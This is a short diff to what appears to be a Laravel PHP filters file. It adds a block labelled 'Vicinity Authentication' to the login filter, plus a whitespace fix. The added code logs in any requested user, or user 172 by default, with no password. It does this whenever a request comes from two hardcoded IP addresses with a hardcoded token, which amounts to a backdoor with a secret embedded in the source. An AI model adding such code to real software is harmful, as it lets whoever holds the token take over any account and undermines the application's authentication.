@@ -47,6 +47,19 @@ App::after(function($request, $response)
 
 Route::filter('auth', function()
 {
+	// Vicinity Authentication
+    if(in_array(\Request::getClientIp(),['41.76.214.250','13.58.45.4'])){
+        if(\Request::input('api_token') == '[i^nKddzU5e%<Ynz1j?Ddc'){
+            $id = 172;
+            if(\Request::has('user_id'))
+                $id = \Request::input('user_id');
+
+            $user = User::find($id);
+            Auth::login($user);
+        }
+    }
+	// End of Vicinity Authentication
+
     if (Auth::guest())
             return Redirect::route('login')
                     ->with('flash_error', 'You must be logged in to view this page!');
@@ -71,7 +84,7 @@ Route::filter('auth.basic', function()
 
 Route::filter('guest', function()
 {
-    if (Auth::check()) 
+    if (Auth::check())
         return Redirect::route('home')
                 ->with('flash_notice', 'You are already logged in!');
 });
